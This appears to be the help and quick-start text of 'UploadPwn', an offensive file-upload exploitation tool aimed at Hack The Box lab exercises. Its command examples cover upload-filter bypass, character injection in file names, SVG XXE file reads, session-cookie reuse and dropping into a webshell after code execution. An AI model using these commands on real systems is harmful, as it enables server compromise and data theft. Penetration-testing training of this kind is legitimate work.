UploadPwn v6.0 — Universal File Upload Exploitation Framework
==============================================================

WHAT'S NEW in v6.0:
  - Threaded two-phase matrix: 10x faster (fuzz extensions first, then shells)
  - Full Character Injection module (%00, %0a, %0d0a, /, .\, ., ..., :)
  - Smart mode (--smart): auto-picks best attacks based on filter probes
  - Parallel verify_rce: checks all dirs/filenames concurrently
  - Guided output: actionable curl one-liners after every finding

QUICK START:

  Smart mode (recommended — fastest path to RCE):
  python3 uploadpwn.py -t http://IP:PORT --smart --interactive

  Full walkthrough with one-liners:
  python3 uploadpwn.py -t http://IP:PORT --walkthrough

  Run everything:
  python3 uploadpwn.py -t http://IP:PORT --all --interactive -v

HTB EXAMPLES:

  Sections 6/7 — client-side bypass, no login:
  python3 uploadpwn.py -t http://IP:PORT

  Section 8 — SVG XXE, read flag directly:
  python3 uploadpwn.py -t http://IP:PORT --svg-read /flag.txt

  Read PHP source to find hidden upload dir:
  python3 uploadpwn.py -t http://IP:PORT --svg-src upload.php

  Login -> simple form (auto-detects CSRF + field names):
  python3 uploadpwn.py -t http://IP:PORT \
    --login /login.php --user admin --pass admin

  Login -> then navigate to sub-page where upload lives:
  python3 uploadpwn.py -t http://IP:PORT \
    --login /login.php --user admin --pass admin \
    --nav /dashboard \
    --upload-page /profile/settings/avatar \
    --field profile_pic

  Already have a session cookie (grabbed from Burp):
  python3 uploadpwn.py -t http://IP:PORT \
    --cookie "PHPSESSID=abc123def456"

  JS-heavy login (React, Angular, etc.):
  python3 uploadpwn.py -t http://IP:PORT \
    --login /login --user admin --pass admin \
    --login-method selenium

  Character injection bypass only:
  python3 uploadpwn.py -t http://IP:PORT --char-inject

  Drop into interactive webshell after RCE:
  python3 uploadpwn.py -t http://IP:PORT --interactive

  Run literally everything:
  python3 uploadpwn.py -t http://IP:PORT \
    --login /login.php --user admin --pass admin \
    --all --interactive -v
